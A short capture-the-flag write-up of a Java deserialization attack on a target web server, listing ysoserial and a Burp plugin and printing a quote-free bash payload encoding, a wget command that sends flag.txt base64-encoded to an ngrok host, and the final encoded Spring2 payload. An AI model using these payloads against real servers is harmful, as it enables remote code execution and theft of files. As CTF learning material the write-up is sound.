# Too Many Credits

This problem involved firing a Java deserialization attack against the target web server in order to gain code execution.

I solved this problem using these tools and resources:

* The Java-deserialization-payload-generator [ysoserial](https://github.com/frohoff/ysoserial).
* The [Java-Deserialization-Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) plugin for Burp Suite, which automates a lot of ysoserial payload generation.
* [This awesome article](https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef), which explained how to overcome some command-encoding obstacles with ysoserial payload generation.

The discovery and exploitation flow went like:

* Use JavaDeserializationScanner to see that deserialization likely exists for base64/gzipped Spring pop chains.
* Use JavaDeserializationScanner to exploit.
* Use some {wget,bash}-fu to exfil command output (and eventually, flag.txt) to a quick-and-dirty [listener server](./listener).

Along the way (thanks to the aforementioned resources), I encountered this slick method of encoding Bash payloads without using quotes:

```sh
bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}
```

Final unencoded exfil payload was:

```
wget http://7143a4ea.ngrok.io/`cat flag.txt|base64`
```

Final encoded `ysoserial` payload:

```
Spring2 'bash -c {echo,d2dldCBodHRwOi8vNzE0M2E0ZWEubmdyb2suaW8vYGNhdCBmbGFnLnR4dHxiYXNlNjRg}|{base64,-d}|{bash,-i}'
```
